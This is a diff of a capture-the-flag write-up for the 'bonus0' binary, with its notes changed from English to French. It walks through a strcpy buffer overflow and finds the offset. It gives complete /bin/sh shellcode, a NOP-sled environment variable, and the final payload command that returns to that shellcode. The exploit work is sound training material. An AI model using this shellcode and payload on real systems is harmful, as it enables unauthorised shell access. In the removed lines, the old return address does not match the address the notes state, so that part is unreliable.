@@ -1,24 +1,23 @@
 gdb bonus0
 
 main function:
-    There is a call to a function named "pp"
+    Il y a un call à la fonction "pp"
 
 pp function:
-    There is a call to "p" two times.
-    and a call to strcpy, so we'll try to overflow it.
+    Il y a deux call à la fonction "p". 
+    et un call à strcyp, on va donc essayer de l'overflow
 
-https://wiremask.eu/tools/buffer-overflow-pattern-generator/
-We use a pattern generator to find the offset.
+On utilise un bufferoverflow pattern generator.
+On a donc un offset au byte 9 de la second string.
+On peut donc faire un bufferoverflow exploit.
 
-We tried every combo to notice that the second string has an offset at the 9th byte.
+Il n'y a pas de call à /bin/sh donc on peut se dire qu'on va faire un shellcode injection.
 
-So we can do a bufferoverflow attack.
+Pour créer notre exploit on va avoir besoin de:
+    - Créer un shellcode
+    - Récupérer l'addresse de notre shellcode
 
-So we'll need to prepare the attack:
-    - Create our shellcode.
-    - Get our shellcode address and a NOP address.
-
-We will take our shellcode from previous exercices: 
+On va utiliser le shellcode de nos exercice précedents
     \x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
 
 export SHELLCODE=`python -c "print '\x90' * 500 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
@@ -28,15 +27,13 @@ x/200xs environ
 0xbffff6d6:      "SHELLCODE=\220...
 
 x/200xg 0xbffff6d6
-We take one our NOP address: 0xbffff7e6
+On prend une des NOP adresse au hasard: 0xbffff8b6
 
-We need to:
+On a dorénavant tout pour créer notre exploit.
+Pour cela on a besoin de:
+    - Remplir le premier buffer.
+    - Ecrire un "\n" pour passer à la seconde string.
+    - Ecrire l'adresse de notre shellcode.
+    - Remplir le second buffer.
 
-Fill the first buffer.
-Write a "\n" to finish the first string.
-Write the address of our shellcode.
-Fill the second buffer.
-
-We have everything to do our attack.
-
-python -c "print 'A' * 4095 + '\n' + 'A' * 9 + '\x6e\xf7\xff\xbf' + 'A'*7" | ./bonus0
+python -c "print 'A' * 4095 + '\n' + 'A' * 9 + '\xb6\xf8\xff\xbf' + 'A'*7" | ./bonus0
